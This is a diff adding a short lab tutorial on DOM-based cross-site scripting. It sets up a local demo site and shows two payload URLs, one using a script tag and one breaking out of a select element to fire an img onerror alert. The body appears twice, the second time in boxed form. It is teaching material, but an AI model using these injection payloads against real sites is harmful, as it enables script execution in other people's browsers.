@@ -1,0 +1,75 @@
+DOM XSS injection
+
+DOM XSS attack is a specific case of the Reflected XSS injection where the Javascript code is passed via URL 
+and dynamically displayed from the URL into the Web page using Javascript.
+
+This method is more discrete and hard to detect than the Reflected one but less popular.
+
+-> Use a demo site.
+Go to /var/www/html. Copy the resources/domxss.zip file to /var/www/html. Create a directory then extract file 
+into it:
+$ cp resources/domxss.zip /var/www/html
+$ cd /var/www/html
+$ sudo mkdir domxss
+$ cd domxss
+$ sudo unzip ../domxss.zip
+$ sudo rm ../domxss.zip
+
+-> Try the intrusion
+1. Open the index page http://127.0.0.1/domxss
+
+2. Try a choice then click on "Changer".
+  >>> you will see the URL: http://127.0.0.1/domxss/?defaut=Polonais
+
+3. Change the URL
+  Replace by: http://127.0.0.1/domxss/?defaut=<script>alert("xss");</script>
+  >>> the box is displayed
+
+-> Try the intrusion without using <script> tag
+  Inspect (Q) the page to see where the <script> tag is managed.
+  Try that URL: http://127.0.0.1/domxss/?defaut=xxx></option></select><img src="xxx" onerror="alert('xss')";/>
+  >>> the box is displayed without <script> tag.
+
+>@
+>@#####################################################################################################################
+>@#                                                                                                                   #
+>@# [ DOM XSS injection | Document Object Model XSS injection ]                                                       #
+>@#                                                                                                                   #
+>@# DOM XSS attack is a specific case of the Reflected XSS injection where the Javascript code is passed via URL      #
+>@# and dynamically displayed from the URL into the Web page using Javascript.                                        #
+>@#                                                                                                                   #
+>@# This method is more discrete and hard to detect than the Reflected one but less popular.                          #
+>@#                                                                                                                   #
+>@# See: howto-1075-owasp-top-10.txt                                                                                  #
+>@# See: howto-1076-owasp-top-10-fr.tx                                                                                #
+>@# See: howto-1092-cross-site-scripting-reflected-xss.txt                                                            #
+>@#                                                                                                                   #
+>@#-------------------------------------------------------------------------------------------------------------------#
+>@
+>@-> Use a demo site.
+>@Go to /var/www/html. Copy the resources/domxss.zip file to /var/www/html. Create a directory then extract file 
+>@into it:
+>@$ cp resources/domxss.zip /var/www/html
+>@$ cd /var/www/html
+>@$ sudo mkdir domxss
+>@$ cd domxss
+>@$ sudo unzip ../domxss.zip
+>@$ sudo rm ../domxss.zip
+>@
+>@-> Try the intrusion
+>@1. Open the index page http://127.0.0.1/domxss
+>@
+>@2. Try a choice then click on "Changer".
+>@  >>> you will see the URL: http://127.0.0.1/domxss/?defaut=Polonais
+>@
+>@3. Change the URL
+>@  Replace by: http://127.0.0.1/domxss/?defaut=<script>alert("xss");</script>
+>@  >>> the box is displayed
+>@
+>@-> Try the intrusion without using <script> tag
+>@  Inspect (Q) the page to see where the <script> tag is managed.
+>@  Try that URL: http://127.0.0.1/domxss/?defaut=xxx></option></select><img src="xxx" onerror="alert('xss')";/>
+>@  >>> the box is displayed without <script> tag.
+>@
+>@#####################################################################################################################
+>@
